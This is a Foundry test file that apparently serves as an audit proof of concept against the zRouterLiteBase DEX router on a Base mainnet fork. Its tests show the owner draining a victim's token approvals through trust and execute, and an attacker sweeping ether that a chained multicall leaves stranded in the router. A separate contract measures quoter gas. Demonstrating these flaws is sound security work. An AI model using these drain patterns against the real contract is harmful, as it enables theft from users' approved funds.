// SPDX-License-Identifier: MIT
pragma solidity ^0.8.36;

import "forge-std/Test.sol";
import {zRouterLiteBase} from "../src/zRouterLiteBase.sol";
import {zQuoterBase} from "../src/zQuoterBase.sol";

interface IE20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract Immut is Test {
    address constant W = 0x4200000000000000000000000000000000000006;
    address constant U = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address constant A = 0x940181a94A35A4569E4529A3CDfB74e38FD98631;
    address constant ZR = 0x000000000000FB114709235f1ccBFfb925F600e4;

    zRouterLiteBase router;
    zQuoterBase quoter;
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");
    address alice = makeAddr("alice");
    address deployer = 0x1C0Aa8cCD568d90d61659F060D1bFb1e6f855A20;

    function setUp() public {
        vm.createSelectFork(vm.envOr("BASE_RPC_URL", string("https://base.meowrpc.com")));
        vm.etch(victim, "");
        vm.etch(attacker, "");
        vm.etch(alice, "");
        vm.etch(deployer, "");
        vm.prank(deployer, deployer);
        deployCodeTo("zRouterLiteBase.sol:zRouterLiteBase", ZR);
        router = zRouterLiteBase(payable(ZR));
        quoter = new zQuoterBase();
        vm.deal(alice, 1000 ether);
        vm.deal(attacker, 10 ether);
    }

    /// The owner can spend every standing approval to the router.
    function testOwnerDrainsApprovalsViaTrustExecute() public {
        deal(U, victim, 10_000e6);
        vm.prank(victim);
        IE20(U).approve(address(router), type(uint256).max);

        vm.startPrank(deployer);
        router.trust(U, true);
        router.execute(
            U, 0, abi.encodeWithSignature("transferFrom(address,address,uint256)", victim, deployer, 10_000e6)
        );
        vm.stopPrank();

        assertEq(IE20(U).balanceOf(victim), 0, "victim kept funds");
        assertEq(IE20(U).balanceOf(deployer), 10_000e6, "owner got nothing");
    }

    /// swapAmount == 0 is documented as "spend what the previous leg credited".
    /// For ether input it reads msg.value instead, so the credited ether is left
    /// in the router where `sweep` is public.
    function testEtherCreditIsNotSpentByAChainedLeg() public {
        // leg 1: USDC -> ETH, output stays in the router (credited).
        (, uint256 ethOut) = quoter.quoteV3(false, U, address(0), 500, 5_000e6);
        if (ethOut == 0) vm.skip(true);

        deal(U, alice, 5_000e6);
        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSelector(
            zRouterLiteBase.swapV3.selector,
            ZR, false, uint24(500), U, address(0), uint256(5_000e6), uint256(0), block.timestamp
        );
        // leg 2: "spend the ether the last leg produced" -> reads msg.value instead.
        calls[1] = abi.encodeWithSelector(
            zRouterLiteBase.swapV2.selector,
            alice, false, address(0), A, uint256(0), uint256(0), block.timestamp
        );

        vm.startPrank(alice);
        IE20(U).approve(address(router), type(uint256).max);
        router.multicall{value: 1 ether}(calls);
        vm.stopPrank();

        emit log_named_uint("ether stranded in router", address(router).balance);
        assertGt(address(router).balance, 0, "no ether stranded");

        // ...and anyone takes it.
        vm.prank(attacker);
        router.sweep(address(0), 0, attacker);
        assertGt(attacker.balance, 10 ether, "attacker did not profit");
    }

    /// Same call with no ether attached simply cannot chain at all.
    function testEtherChainWithNoMsgValueReverts() public {
        deal(U, alice, 5_000e6);
        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSelector(
            zRouterLiteBase.swapV3.selector,
            ZR, false, uint24(500), U, address(0), uint256(5_000e6), uint256(0), block.timestamp
        );
        calls[1] = abi.encodeWithSelector(
            zRouterLiteBase.swapV2.selector,
            alice, false, address(0), A, uint256(0), uint256(0), block.timestamp
        );
        vm.startPrank(alice);
        IE20(U).approve(address(router), type(uint256).max);
        vm.expectRevert(zRouterLiteBase.BadSwap.selector);
        router.multicall(calls);
        vm.stopPrank();
    }
}

contract Gas is Test {
    address constant U = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address constant A = 0x940181a94A35A4569E4529A3CDfB74e38FD98631;
    address constant CB = 0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf;
    zQuoterBase quoter;

    function setUp() public {
        vm.createSelectFork(vm.envOr("BASE_RPC_URL", string("https://base.meowrpc.com")));
        quoter = new zQuoterBase();
    }

    function testBuilderGas() public {
        uint256 g = gasleft();
        quoter.getQuotes(false, address(0), U, 1 ether);
        emit log_named_uint("getQuotes 1e18 ETH->USDC", g - gasleft());

        g = gasleft();
        quoter.buildBestSwapViaETHMulticall(address(1), address(1), false, U, A, 50_000e6, 100, block.timestamp);
        emit log_named_uint("viaETHMulticall 50k USDC->AERO", g - gasleft());

        g = gasleft();
        quoter.buildHybridSplit(address(1), U, CB, 250_000e6, 100, block.timestamp);
        emit log_named_uint("hybridSplit 250k USDC->cbBTC", g - gasleft());

        g = gasleft();
        quoter.buildSplitSwap(address(1), U, A, 250_000e6, 100, block.timestamp);
        emit log_named_uint("splitSwap 250k USDC->AERO", g - gasleft());
    }
}
